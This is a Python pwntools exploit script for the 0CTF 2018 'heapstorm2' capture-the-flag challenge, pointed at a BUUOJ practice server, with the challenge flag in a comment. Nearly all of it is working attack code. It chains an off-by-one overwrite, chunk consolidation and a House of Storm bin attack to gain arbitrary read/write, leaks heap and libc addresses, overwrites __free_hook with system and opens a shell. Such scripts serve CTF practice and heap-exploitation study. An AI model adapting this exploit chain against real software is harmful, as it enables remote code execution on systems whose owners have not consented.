#!/usr/bin/env python
# encoding: utf-8

#flag{Seize it, control it, and exploit it. Welcome to the House of Storm.}

import itertools
from hashlib import sha256
from pwn import *

context(arch='amd64', os='linux', log_level='info')
context.terminal = ['tmux', 'splitw', '-h']
r = None
def alloc(size):
    r.sendline('1')
    r.recvuntil('Size: ')
    assert(12 < size <= 0x1000)
    r.sendline('%d' % size)
    r.recvuntil('Command: ')

def update(idx, content):
    r.sendline('2')
    r.recvuntil('Index: ')
    r.sendline('%d' % idx)
    r.recvuntil('Size: ')
    r.sendline('%d' % len(content))
    r.recvuntil('Content: ')
    r.send(content)
    r.recvuntil('Command: ')

def free(idx):
    r.sendline('3')
    r.recvuntil('Index: ')
    r.sendline('%d' % idx)
    r.recvuntil('Command: ')

def view(idx):
    r.sendline('4')
    r.recvuntil('Index: ')
    r.sendline('%d' % idx)
    m = r.recvuntil('Command: ')
    pos1 = m.find(']: ') + len(']: ')
    pos2 = m.find('\n1. ')
    return m[pos1:pos2]

def exploit(host):
    global r
    port = 27027

    while True:
        r = remote(host, port)
        # r = process('./0ctf_2018_heapstorm2')
        libc = ELF('../../libc_file/16-64-libc-2.23.so')
        r.recvuntil('Command: ')

        alloc(0x18)     #0
        alloc(0x508)    #1
        alloc(0x18)     #2
        update(1, 'h'*0x4f0 + p64(0x500))   #set fake prev_size

        alloc(0x18)     #3
        alloc(0x508)    #4
        alloc(0x18)     #5
        update(4, 'h'*0x4f0 + p64(0x500))   #set fake prev_size
        alloc(0x18)     #6

        free(1)
        update(0, 'h'*(0x18-12))    #off-by-one
        alloc(0x18)     #1
        alloc(0x4d8)    #7
        free(1)
        free(2)         #backward consolidate
        alloc(0x38)     #1
        alloc(0x4e8)    #2

        free(4)
        update(3, 'h'*(0x18-12))    #off-by-one
        alloc(0x18)     #4
        alloc(0x4d8)    #8
        free(4)
        free(5)         #backward consolidate
        alloc(0x48)     #4

        free(2)
        alloc(0x4e8)    #2
        free(2)

        storage = 0x13370000 + 0x800
        fake_chunk = storage - 0x20

        p1 = p64(0)*2 + p64(0) + p64(0x4f1) #size
        p1 += p64(0) + p64(fake_chunk)      #bk
        update(7, p1)

        p2 = p64(0)*4 + p64(0) + p64(0x4e1) #size
        p2 += p64(0) + p64(fake_chunk+8)    #bk, for creating the "bk" of the faked chunk to avoid crashing when unlinking from unsorted bin
        p2 += p64(0) + p64(fake_chunk-0x18-5)   #bk_nextsize, for creating the "size" of the faked chunk, using misalignment tricks
        update(8, p2)

        try:
            # if the heap address starts with "0x56", you win
            alloc(0x48)     #2
        except EOFError:
            # otherwise crash and try again
            r.close()
            continue
        # gdb.attach(r, 'bin\n')
        # pause()
        payload = p64(0)*2 + p64(0) + p64(0) + p64(0) + p64(0x13377331) + p64(storage)
        update(2, payload)

        payload = p64(0) + p64(0) + p64(0) + p64(0x13377331) + p64(storage) + p64(0x1000) + p64(storage-0x20+3) + p64(8)
        update(0, payload)

        leak = view(1)
        heap = u64(leak)
        print ('heap: %x' % heap)
        # gdb.attach(r, 'bin\n')
        # pause()

        payload = p64(0) + p64(0) + p64(0) + p64(0x13377331) + p64(storage) + p64(0x1000) + p64(heap+0x10) + p64(8)
        update(0, payload)

        leak = view(1)
        unsorted_bin = u64(leak)
        main_arena = unsorted_bin - 88
        libc_base = main_arena - 0x3c4b20
        print ('libc_base: %x' % libc_base)
        libc_system = libc_base + libc.symbols['system']
        free_hook = libc_base + libc.symbols['__free_hook']

        payload = p64(0) + p64(0) + p64(0) + p64(0x13377331) + p64(storage) + p64(0x1000) + p64(free_hook) + p64(0x100) + p64(storage+0x50) + p64(0x100) + '/bin/sh\0'
        update(0, payload)
        update(1, p64(libc_system))

        r.sendline('3')
        r.recvuntil('Index: ')
        r.sendline('%d' % 2)
        break

if __name__ == '__main__':
    host = 'node4.buuoj.cn'
    exploit(host)
    r.interactive()